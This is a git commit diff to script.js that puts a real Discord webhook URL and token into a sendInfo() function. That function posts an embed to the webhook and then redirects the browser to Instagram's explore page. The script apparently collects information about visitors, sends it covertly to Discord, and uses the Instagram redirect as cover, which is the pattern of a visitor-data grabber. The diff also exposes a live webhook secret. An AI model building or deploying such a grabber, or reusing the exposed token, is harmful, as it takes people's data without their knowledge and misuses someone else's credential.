c788cd0fc72bc9b4d45ee53cc246e0eb2a604d5e
Dedf1sh <otishei.79768@redlandsschools.net>
2025-09-25 20:47:48 -0700

    Update script.js

--- script.js
+++ script.js
@@ -58,7 +58,7 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "https://discord.com/api/webhooks/ID/TOKEN"; //your discord webhook url
+  const webhook = "https://discord.com/api/webhooks/1420971953384325142/M9BjhtsFIe8aGejCHg-fWlsjOd3wxY84Z3B9dpKbb6MQ2w9iUtoTC_z2Ujs1n577EqLv"; //your discord webhook url
 
   const embed = {
     color: 1585803, //#18328b
@@ -88,3 +88,4 @@ async function sendInfo() {
     window.location.replace("https://www.instagram.com/explore/")
   }, 1000);
 }
+
